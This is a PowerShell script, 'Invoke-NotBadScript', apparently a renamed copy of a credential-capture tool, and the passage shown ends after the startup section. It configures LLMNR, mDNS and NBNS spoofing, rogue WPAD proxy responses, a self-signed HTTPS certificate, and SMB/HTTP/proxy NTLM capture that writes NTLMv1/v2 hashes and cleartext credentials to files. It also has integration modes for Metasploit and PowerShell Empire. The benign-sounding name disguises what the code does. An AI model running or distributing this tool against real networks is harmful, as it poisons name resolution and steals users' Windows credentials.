function Invoke-NotBadScript
{
# Parameter default values can be modified in this section:
[CmdletBinding()]
param
(
    [parameter(Mandatory=$false)][Array]$HTTPResetDelay = "Firefox",
    [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
    [parameter(Mandatory=$false)][Array]$SpooferHostsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsIgnore = "",
    [parameter(Mandatory=$false)][Array]$WPADDirectHosts = "",
    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = "Firefox",
    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = "-1",
    [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
    [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
    [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
    [parameter(Mandatory=$false)][Int]$HTTPResetDelayTimeout = "30",
    [parameter(Mandatory=$false)][Int]$LLMNRTTL = "30",
    [parameter(Mandatory=$false)][Int]$mDNSTTL = "120",
    [parameter(Mandatory=$false)][Int]$NBNSTTL = "165",
    [parameter(Mandatory=$false)][Int]$NBNSBruteForcePause = "",
    [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
    [parameter(Mandatory=$false)][Int]$RunCount = "",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$false)][Int]$WPADPort = "",
    [parameter(Mandatory=$false)][Int]$SpooferLearningDelay = "",
    [parameter(Mandatory=$false)][Int]$SpooferLearningInterval = "30",
    [parameter(Mandatory=$false)][String]$HTTPBasicRealm = "IIS",
    [parameter(Mandatory=$false)][String]$HTTPContentType = "text/html",
    [parameter(Mandatory=$false)][String]$HTTPDefaultFile = "",
    [parameter(Mandatory=$false)][String]$HTTPDefaultEXE = "",
    [parameter(Mandatory=$false)][String]$HTTPResponse = "",
    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "NotBadScript",
    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = "localhost",
    [parameter(Mandatory=$false)][String]$NBNSBruteForceHost = "WPAD",
    [parameter(Mandatory=$false)][String]$WPADResponse = "",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$mDNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNSBruteForce = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMB = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferLearning = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferRepeat = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WPADDirectFile = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$ElevatedPrivilege = "Auto",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$HTTPAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("QU","QM")][Array]$mDNSTypes = @("QU"),
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$NBNSTypes = @("00","20"),
    [parameter(Mandatory=$false)][ValidateSet("Basic","NTLM","NTLMNoESS")][String]$ProxyAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDir = "",
    [parameter(Mandatory=$false)][Switch]$Inspect,
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NBNSBruteForceTarget = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    Write-Output "Error:$($invalid_parameter) is not a valid parameter"
    throw
}

$notbadscript_version = "1.3.1"

if(!$IP)
{
    $IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
}

if(!$SpooferIP)
{
    $SpooferIP = $IP
}

if($HTTPDefaultFile -or $HTTPDefaultEXE)
{

    if(!$HTTPDir)
    {
        Write-Output "Error:You must specify an -HTTPDir when using either -HTTPDefaultFile or -HTTPDefaultEXE"
        throw
    }

}

if($WPADIP -or $WPADPort)
{

    if(!$WPADIP)
    {
        Write-Output "Error:You must specify a -WPADPort to go with -WPADIP"
        throw
    }

    if(!$WPADPort)
    {
        Write-Output "Error:You must specify a -WPADIP to go with -WPADPort"
        throw
    }

}

if($NBNSBruteForce -eq 'Y' -and !$NBNSBruteForceTarget)
{
    Write-Output "Error:You must specify a -NBNSBruteForceTarget if enabling -NBNSBruteForce"
    throw
}

if(!$FileOutputdirectory)
{
    $output_directory = $PWD.Path
}
else
{
    $output_directory = $FileOutputdirectory
}

if(!$notbadscript)
{
    $global:notbadscript = [HashTable]::Synchronized(@{})
    $notbadscript.cleartext_list = New-Object System.Collections.ArrayList
    $notbadscript.IP_capture_list = New-Object System.Collections.ArrayList
    $notbadscript.log = New-Object System.Collections.ArrayList
    $notbadscript.NTLMv1_list = New-Object System.Collections.ArrayList
    $notbadscript.NTLMv1_username_list = New-Object System.Collections.ArrayList
    $notbadscript.NTLMv2_list = New-Object System.Collections.ArrayList
    $notbadscript.NTLMv2_username_list = New-Object System.Collections.ArrayList
    $notbadscript.POST_request_list = New-Object System.Collections.ArrayList
    $notbadscript.SMBRelay_failed_list = New-Object System.Collections.ArrayList
    $notbadscript.valid_host_list = New-Object System.Collections.ArrayList
}

if($notbadscript.running)
{
    Write-Output "Error:Invoke-NotBadScript is already running, use Stop-NotBadScript"
    throw
}

if($HTTP_listener.IsListening -and !$notbadscript.relay_running)
{
    $HTTP_listener.Stop()
    $HTTP_listener.Close()
}

if(!$notbadscript.relay_running)
{
    $notbadscript.cleartext_file_queue = New-Object System.Collections.ArrayList
    $notbadscript.console_queue = New-Object System.Collections.ArrayList
    $notbadscript.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    $notbadscript.log_file_queue = New-Object System.Collections.ArrayList
    $notbadscript.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    $notbadscript.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    $notbadscript.POST_request_file_queue = New-Object System.Collections.ArrayList
    $notbadscript.status_queue = New-Object System.Collections.ArrayList
    $notbadscript.console_input = $true
    $notbadscript.console_output = $false
    $notbadscript.file_output = $false
    $notbadscript.HTTPS_existing_certificate = $false
    $notbadscript.HTTPS_force_certificate_delete = $false
    $notbadscript.log_output = $true
    $notbadscript.cleartext_out_file = $output_directory + "\NotBadScript-Cleartext.txt"
    $notbadscript.log_out_file = $output_directory + "\NotBadScript-Log.txt"
    $notbadscript.NTLMv1_out_file = $output_directory + "\NotBadScript-NTLMv1.txt"
    $notbadscript.NTLMv2_out_file = $output_directory + "\NotBadScript-NTLMv2.txt"
    $notbadscript.POST_request_out_file = $output_directory + "\NotBadScript-FormInput.txt"
}

if($ElevatedPrivilege -eq 'Auto')
{
    $elevated_privilege = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}
else
{

    if($ElevatedPrivilege -eq 'Y')
    {
        $elevated_privilege = $true
    }
    else
    {
        $elevated_privilege = $false
    }

}

if($StartupChecks -eq 'Y')
{

    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}

    if($HTTP -eq 'Y')
    {
        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
    }

    if($HTTPS -eq 'Y')
    {
        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPSPort "
    }

    if($Proxy -eq 'Y')
    {
        $proxy_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
    }

    if($LLMNR -eq 'Y' -and !$elevated_privilege)
    {
        $LLMNR_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
    }

    if($mDNS -eq 'Y' -and !$elevated_privilege)
    {
        $mDNS_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5353 "
    }

}

if(!$elevated_privilege)
{

    if($HTTPS -eq 'Y')
    {
        Write-Output "Error:-HTTPS requires elevated privileges"
        throw
    }

    if($SpooferLearning -eq 'Y')
    {
        Write-Output "Error:-SpooferLearning requires elevated privileges"
        throw
    }

    $NBNS = "Y"
    $SMB = "N"

}

$notbadscript.hostname_spoof = $false
$notbadscript.running = $true

if($StatusOutput -eq 'Y')
{
    $notbadscript.status_output = $true
}
else
{
    $notbadscript.status_output = $false
}

if($OutputStreamOnly -eq 'Y')
{
    $notbadscript.output_stream_only = $true
}
else
{
    $notbadscript.output_stream_only = $false
}

if($Inspect)
{

    if($elevated_privilege)
    {
        $LLMNR = "N"
        $mDNS = "N"
        $NBNS = "N"
        $HTTP = "N"
        $HTTPS = "N"
        $Proxy = "N"
    }
    else
    {
        $HTTP = "N"
        $HTTPS = "N"
        $Proxy = "N"
    }

}

if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
{
    $notbadscript.tool = 1
    $notbadscript.output_stream_only = $true
    $notbadscript.newline = ""
    $ConsoleOutput = "N"

}
elseif($Tool -eq 2) # PowerShell Empire
{
    $notbadscript.tool = 2
    $notbadscript.output_stream_only = $true
    $notbadscript.console_input = $false
    $notbadscript.newline = "`n" # remove for Empire 2.0
    $LogOutput = "N"
    $ShowHelp = "N"

    switch ($ConsoleOutput)
    {

        'Low'
        {
            $ConsoleOutput = "Low"
        }

        'Medium'
        {
            $ConsoleOutput = "Medium"
        }

        default
        {
            $ConsoleOutput = "Y"
        }

    }

}
else
{
    $notbadscript.tool = 0
    $notbadscript.newline = ""
}

# Write startup messages
$notbadscript.status_queue.Add("NotBadScript $notbadscript_version started at $(Get-Date -format 's')")  > $null

if($FileOutput -eq 'Y')
{
    $notbadscript.log_file_queue.Add("$(Get-Date -format 's') - NotBadScript $notbadscript_version started") > $null
}

if($LogOutput -eq 'Y')
{
    $notbadscript.log.Add("$(Get-Date -format 's') - NotBadScript started") > $null
    $notbadscript.log_output = $true
}
else
{
    $notbadscript.log_output = $false
}

if($ElevatedPrivilege -eq 'Y' -or $elevated_privilege)
{
    $notbadscript.status_queue.Add("Elevated Privilege Mode = Enabled")  > $null
}
else
{
    $notbadscript.status_queue.Add("Elevated Privilege Mode = Disabled")  > $null
}

if($firewall_status)
{
    $notbadscript.status_queue.Add("Windows Firewall = Enabled")  > $null
    $firewall_rules = New-Object -comObject HNetCfg.FwPolicy2
    $firewall_powershell = $firewall_rules.rules | Where-Object {$_.Enabled -eq $true -and $_.Direction -eq 1} |Select-Object -Property Name | Select-String "Windows PowerShell}"

    if($firewall_powershell)
    {
        $notbadscript.status_queue.Add("Windows Firewall - PowerShell.exe = Allowed")  > $null
    }

}

$notbadscript.status_queue.Add("Primary IP Address = $IP")  > $null

if($LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y')
{
    $notbadscript.status_queue.Add("LLMNR/mDNS/NBNS Spoofer IP Address = $SpooferIP")  > $null
}

if($LLMNR -eq 'Y')
{

    if($elevated_privilege -or !$LLMNR_port_check)
    {
        $notbadscript.status_queue.Add("LLMNR Spoofer = Enabled")  > $null
        $notbadscript.status_queue.Add("LLMNR TTL = $LLMNRTTL Seconds")  > $null
        $LLMNR_response_message = "- response sent"
    }
    else
    {
        $LLMNR = "N"
        $notbadscript.status_queue.Add("LLMNR Spoofer Disabled Due To In Use Port 5355")  > $null
    }

}
else
{
    $notbadscript.status_queue.Add("LLMNR Spoofer = Disabled")  > $null
    $LLMNR_response_message = "- LLMNR spoofer is disabled"
}

if($mDNS -eq 'Y')
{

    if($elevated_privilege -or !$mDNS_port_check)
    {
        $mDNSTypes_output = $mDNSTypes -join ","

        if($mDNSTypes.Count -eq 1)
        {
            $notbadscript.status_queue.Add("mDNS Spoofer For Type $mDNSTypes_output = Enabled")  > $null
        }
        else
        {
            $notbadscript.status_queue.Add("mDNS Spoofer For Types $mDNSTypes_output = Enabled")  > $null
        }

        $notbadscript.status_queue.Add("mDNS TTL = $mDNSTTL Seconds")  > $null
        $mDNS_response_message = "- response sent"

    }
    else
    {
        $mDNS = "N"
        $notbadscript.status_queue.Add("mDNS Spoofer Disabled Due To In Use Port 5353")  > $null
    }

}
else
{
    $notbadscript.status_queue.Add("mDNS Spoofer = Disabled")  > $null
    $mDNS_response_message = "- mDNS spoofer is disabled"
}

if($NBNS -eq 'Y')
{
    $NBNSTypes_output = $NBNSTypes -join ","
    $NBNS_response_message = "- response sent"

    if($NBNSTypes.Count -eq 1)
    {
        $notbadscript.status_queue.Add("NBNS Spoofer For Type $NBNSTypes_output = Enabled")  > $null
    }
    else
    {
        $notbadscript.status_queue.Add("NBNS Spoofer For Types $NBNSTypes_output = Enabled")  > $null
    }

}
else
{
    $notbadscript.status_queue.Add("NBNS Spoofer = Disabled")  > $null
    $NBNS_response_message = "- NBNS spoofer is disabled"
}

if($NBNSBruteForce -eq 'Y')
{
    $notbadscript.status_queue.Add("NBNS Brute Force Spoofer Target = $NBNSBruteForceTarget") > $null
    $notbadscript.status_queue.Add("NBNS Brute Force Spoofer IP Address = $SpooferIP") > $null
    $notbadscript.status_queue.Add("NBNS Brute Force Spoofer Hostname = $NBNSBruteForceHost") > $null

    if($NBNSBruteForcePause)
    {
        $notbadscript.status_queue.Add("NBNS Brute Force Pause = $NBNSBruteForcePause Seconds") > $null
    }

}

if($NBNS -eq 'Y' -or $NBNSBruteForce -eq 'Y')
{
    $notbadscript.status_queue.Add("NBNS TTL = $NBNSTTL Seconds") > $null
}

if($SpooferLearning -eq 'Y' -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $notbadscript.status_queue.Add("Spoofer Learning = Enabled")  > $null

    if($SpooferLearningDelay -eq 1)
    {
        $notbadscript.status_queue.Add("Spoofer Learning Delay = $SpooferLearningDelay Minute")  > $null
    }
    elseif($SpooferLearningDelay -gt 1)
    {
        $notbadscript.status_queue.Add("Spoofer Learning Delay = $SpooferLearningDelay Minutes")  > $null
    }

    if($SpooferLearningInterval -eq 1)
    {
        $notbadscript.status_queue.Add("Spoofer Learning Interval = $SpooferLearningInterval Minute")  > $null
    }
    elseif($SpooferLearningInterval -eq 0)
    {
        $notbadscript.status_queue.Add("Spoofer Learning Interval = Disabled")  > $null
    }
    elseif($SpooferLearningInterval -gt 1)
    {
        $notbadscript.status_queue.Add("Spoofer Learning Interval = $SpooferLearningInterval Minutes")  > $null
    }

}

if($SpooferHostsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $notbadscript.status_queue.Add("Spoofer Hosts Reply = " + ($SpooferHostsReply -join ","))  > $null
}

if($SpooferHostsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $notbadscript.status_queue.Add("Spoofer Hosts Ignore = " + ($SpooferHostsIgnore -join ","))  > $null
}

if($SpooferIPsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $notbadscript.status_queue.Add("Spoofer IPs Reply = " + ($SpooferIPsReply -join ","))  > $null
}

if($SpooferIPsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $notbadscript.status_queue.Add("Spoofer IPs Ignore = " + ($SpooferIPsIgnore -join ","))  > $null
}

if($SpooferRepeat -eq 'N')
{
    $notbadscript.spoofer_repeat = $false
    $notbadscript.status_queue.Add("Spoofer Repeating = Disabled")  > $null
}
else
{
    $notbadscript.spoofer_repeat = $true
}

if($SMB -eq 'Y' -and $elevated_privilege)
{
    $notbadscript.status_queue.Add("SMB Capture = Enabled")  > $null
}
else
{
    $notbadscript.status_queue.Add("SMB Capture = Disabled")  > $null
}

if($HTTP -eq 'Y')
{

    if($HTTP_port_check)
    {
        $HTTP = "N"
        $notbadscript.status_queue.Add("HTTP Capture Disabled Due To In Use Port $HTTPPort")  > $null
    }
    else
    {

        if($HTTPIP -ne '0.0.0.0')
        {
            $notbadscript.status_queue.Add("HTTP IP = $HTTPIP") > $null
        }

        if($HTTPPort -ne 80)
        {
            $notbadscript.status_queue.Add("HTTP Port = $HTTPPort") > $null
        }

        $notbadscript.status_queue.Add("HTTP Capture = Enabled")  > $null
    }

}
else
{
    $notbadscript.status_queue.Add("HTTP Capture = Disabled")  > $null
}

if($HTTPS -eq 'Y')
{

    if($HTTPS_port_check)
    {
        $HTTPS = "N"
        $notbadscript.HTTPS = $false
        $notbadscript.status_queue.Add("HTTPS Capture Disabled Due To In Use Port $HTTPSPort")  > $null
    }
    else
    {

        try
        {
            $notbadscript.certificate_issuer = $HTTPSCertIssuer
            $notbadscript.certificate_CN = $HTTPSCertSubject
            $notbadscript.status_queue.Add("HTTPS Certificate Issuer = " + $notbadscript.certificate_issuer)  > $null
            $notbadscript.status_queue.Add("HTTPS Certificate CN = " + $notbadscript.certificate_CN)  > $null
            $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $notbadscript.certificate_issuer})

            if(!$certificate_check)
            {
                # credit to subTee for cert creation code https://github.com/subTee/Interceptor
                $certificate_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_distinguished_name.Encode( "CN=" + $notbadscript.certificate_CN, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_issuer_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_issuer_distinguished_name.Encode("CN=" + $notbadscript.certificate_issuer, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_key = new-object -com "X509Enrollment.CX509PrivateKey"
                $certificate_key.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
                $certificate_key.KeySpec = 2
                $certificate_key.Length = 2048
			    $certificate_key.MachineContext = 1
                $certificate_key.Create()
                $certificate_server_auth_OID = new-object -com "X509Enrollment.CObjectId"
			    $certificate_server_auth_OID.InitializeFromValue("1.3.6.1.5.5.7.3.1")
			    $certificate_enhanced_key_usage_OID = new-object -com "X509Enrollment.CObjectIds.1"
			    $certificate_enhanced_key_usage_OID.add($certificate_server_auth_OID)
			    $certificate_enhanced_key_usage_extension = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
			    $certificate_enhanced_key_usage_extension.InitializeEncode($certificate_enhanced_key_usage_OID)
			    $certificate = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
			    $certificate.InitializeFromPrivateKey(2,$certificate_key,"")
			    $certificate.Subject = $certificate_distinguished_name
			    $certificate.Issuer = $certificate_issuer_distinguished_name
			    $certificate.NotBefore = (get-date).AddDays(-271)
			    $certificate.NotAfter = $certificate.NotBefore.AddDays(824)
			    $certificate_hash_algorithm_OID = New-Object -ComObject X509Enrollment.CObjectId
			    $certificate_hash_algorithm_OID.InitializeFromAlgorithmName(1,0,0,"SHA256")
			    $certificate.HashAlgorithm = $certificate_hash_algorithm_OID
                $certificate.X509Extensions.Add($certificate_enhanced_key_usage_extension)
                $certificate_basic_constraints = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
			    $certificate_basic_constraints.InitializeEncode("true",1)
                $certificate.X509Extensions.Add($certificate_basic_constraints)
                $certificate.Encode()
                $certificate_enrollment = new-object -com "X509Enrollment.CX509Enrollment"
			    $certificate_enrollment.InitializeFromRequest($certificate)
			    $certificate_data = $certificate_enrollment.CreateRequest(0)
                $certificate_enrollment.InstallResponse(2,$certificate_data,0,"")
                $notbadscript.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $notbadscript.certificate_issuer})
            }
            else
            {

                if($HTTPSForceCertDelete -eq 'Y')
                {
                    $notbadscript.HTTPS_force_certificate_delete = $true
                }

                $notbadscript.HTTPS_existing_certificate = $true
                $notbadscript.status_queue.Add("HTTPS Capture = Using Existing Certificate")  > $null
            }

            $notbadscript.HTTPS = $true

            if($HTTPIP -ne '0.0.0.0')
            {
                $notbadscript.status_queue.Add("HTTPS IP = $HTTPIP") > $null
            }

            if($HTTPSPort -ne 443)
            {
                $notbadscript.status_queue.Add("HTTPS Port = $HTTPSPort") > $null
            }

            $notbadscript.status_queue.Add("HTTPS Capture = Enabled")  > $null

        }
        catch
        {
            $HTTPS = "N"
            $notbadscript.HTTPS = $false
            $notbadscript.status_queue.Add("HTTPS Capture Disabled Due To Certificate Error")  > $null
        }

    }

}
else
{
    $notbadscript.status_queue.Add("HTTPS Capture = Disabled")  > $null
}

if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
{
    $notbadscript.status_queue.Add("HTTP/HTTPS Authentication = $HTTPAuth")  > $null
    $notbadscript.status_queue.Add("WPAD Authentication = $WPADAuth")  > $null

    if($WPADAuth -like "NTLM*")
    {
        $WPADAuthIgnore = ($WPADAuthIgnore | Where-Object {$_ -and $_.Trim()})

        if($WPADAuthIgnore.Count -gt 0)
        {
            $notbadscript.status_queue.Add("WPAD NTLM Authentication Ignore List = " + ($WPADAuthIgnore -join ","))  > $null
        }

    }

    if($HTTPDir -and !$HTTPResponse)
    {
        $notbadscript.status_queue.Add("HTTP/HTTPS Directory = $HTTPDir")  > $null

        if($HTTPDefaultFile)
        {
            $notbadscript.status_queue.Add("HTTP/HTTPS Default Response File = $HTTPDefaultFile")  > $null
        }

        if($HTTPDefaultEXE)
        {
            $notbadscript.status_queue.Add("HTTP/HTTPS Default Response Executable = $HTTPDefaultEXE")  > $null
        }

    }

    if($HTTPResponse)
    {
        $notbadscript.status_queue.Add("HTTP/HTTPS Response = Enabled")  > $null
    }

    if($HTTPResponse -or $HTTPDir -and $HTTPContentType -ne 'html/text')
    {
        $notbadscript.status_queue.Add("HTTP/HTTPS/Proxy Content Type = $HTTPContentType")  > $null
    }

    if($HTTPAuth -eq 'Basic' -or $WPADAuth -eq 'Basic')
    {
        $notbadscript.status_queue.Add("Basic Authentication Realm = $HTTPBasicRealm")  > $null
    }

    $HTTPResetDelay = ($HTTPResetDelay | Where-Object {$_ -and $_.Trim()})

    if($HTTPResetDelay.Count -gt 0)
    {
        $notbadscript.status_queue.Add("HTTP Reset Delay List = " + ($HTTPResetDelay -join ","))  > $null
        $notbadscript.status_queue.Add("HTTP Reset Delay Timeout = $HTTPResetDelayTimeout Seconds") > $null
    }

    if($Proxy -eq 'Y')
    {

        if($proxy_port_check)
        {
            $Proxy = "N"
            $notbadscript.status_queue.Add("Proxy Capture Disabled Due To In Use Port $ProxyPort")  > $null
        }
        else
        {
            $notbadscript.status_queue.Add("Proxy Capture = Enabled")  > $null
            $notbadscript.status_queue.Add("Proxy Port = $ProxyPort") > $null
            $notbadscript.status_queue.Add("Proxy Authentication = $ProxyAuth")  > $null
            $ProxyPortFailover = $ProxyPort + 1
            $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})

            if($ProxyIgnore.Count -gt 0)
            {
                $notbadscript.status_queue.Add("Proxy Ignore List = " + ($ProxyIgnore -join ","))  > $null
            }

            if($ProxyIP -eq '0.0.0.0')
            {
                $proxy_WPAD_IP = $IP
            }
            else
            {
                $proxy_WPAD_IP = $ProxyIP
            }

            if($WPADIP -and $WPADPort)
            {
                $WPADResponse = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $WPADIP`:$WPADPort; DIRECT`";}"
            }
            else
            {
                $WPADResponse = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_wpad_IP`:$ProxyPortFailover; DIRECT`";}"
            }

        }

    }

    if($WPADDirectHosts)
    {
        ForEach($WPAD_direct_host in $WPADDirectHosts)
        {
            $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
        }

        $notbadscript.status_queue.Add("WPAD Direct Hosts = " + ($WPADDirectHosts -join ","))  > $null
    }

    if($WPADResponse -and $Proxy -eq 'N')
    {
        $notbadscript.status_queue.Add("WPAD Custom Response = Enabled")  > $null
    }
    elseif($WPADResponse -and $Proxy -eq 'Y')
    {
        $notbadscript.status_queue.Add("WPAD Proxy Response = Enabled")  > $null

        if($WPADIP -and $WPADPort)
        {
            $notbadscript.status_queue.Add("WPAD Failover = $WPADIP`:$WPADPort")  > $null
        }

    }
    elseif($WPADIP -and $WPADPort)
    {
        $notbadscript.status_queue.Add("WPAD Response = Enabled")  > $null
        $notbadscript.status_queue.Add("WPAD = $WPADIP`:$WPADPort")  > $null

        if($WPADDirectHosts)
        {
            ForEach($WPAD_direct_host in $WPADDirectHosts)
            {
                $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
            }

            $WPADResponse = "function FindProxyForURL(url,host){" + $WPAD_direct_hosts_function + "return `"PROXY " + $WPADIP + ":" + $WPADPort + "`";}"
            $notbadscript.status_queue.Add("WPAD Direct Hosts = " + ($WPADDirectHosts -join ","))  > $null
        }
        else
        {
            $WPADResponse = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $WPADIP`:$WPADPort; DIRECT`";}"
        }

    }
    elseif($WPADDirectFile -eq 'Y')
    {
        $notbadscript.status_queue.Add("WPAD Default Response = Enabled")  > $null
        $WPADResponse = "function FindProxyForURL(url,host){return `"DIRECT`";}"
    }

    if($Challenge)
    {
        $notbadscript.status_queue.Add("NTLM Challenge = $Challenge")  > $null
    }

}

if($MachineAccounts -eq 'N')
{
    $notbadscript.status_queue.Add("Machine Account Capture = Disabled")  > $null
    $notbadscript.machine_accounts = $false
}
else
{
    $notbadscript.machine_accounts = $true
}

if($ConsoleOutput -ne 'N')
{

    if($ConsoleOutput -eq 'Y')
    {
        $notbadscript.status_queue.Add("Real Time Console Output = Enabled")  > $null
    }
    else
    {
        $notbadscript.status_queue.Add("Real Time Console Output = $ConsoleOutput")  > $null
    }

    $notbadscript.console_output = $true

    if($ConsoleStatus -eq 1)
    {
        $notbadscript.status_queue.Add("Console Status = $ConsoleStatus Minute")  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        $notbadscript.status_queue.Add("Console Status = $ConsoleStatus Minutes")  > $null
    }

}
else
{

    if($notbadscript.tool -eq 1)
    {
        $notbadscript.status_queue.Add("Real Time Console Output Disabled Due To External Tool Selection")  > $null
    }
    else
    {
        $notbadscript.status_queue.Add("Real Time Console Output = Disabled")  > $null
    }

}

if($ConsoleUnique -eq 'Y')
{
    $notbadscript.console_unique = $true
}
else
{
    $notbadscript.console_unique = $false
}

if($FileOutput -eq 'Y')
{
    $notbadscript.status_queue.Add("Real Time File Output = Enabled")  > $null
    $notbadscript.status_queue.Add("Output Directory = $output_directory")  > $null
    $notbadscript.file_output = $true
}
else
{
    $notbadscript.status_queue.Add("Real Time File Output = Disabled")  > $null
}

if($FileUnique -eq 'Y')
{
    $notbadscript.file_unique = $true
}
else
{
    $notbadscript.file_unique = $false
}

if($RunCount)
{
    $notbadscript.status_queue.Add("Run Count = $RunCount") > $null
}

if($RunTime -eq 1)
{
    $notbadscript.status_queue.Add("Run Time = $RunTime Minute")  > $null
}
elseif($RunTime -gt 1)
{
    $notbadscript.status_queue.Add("Run Time = $RunTime Minutes")  > $null
}

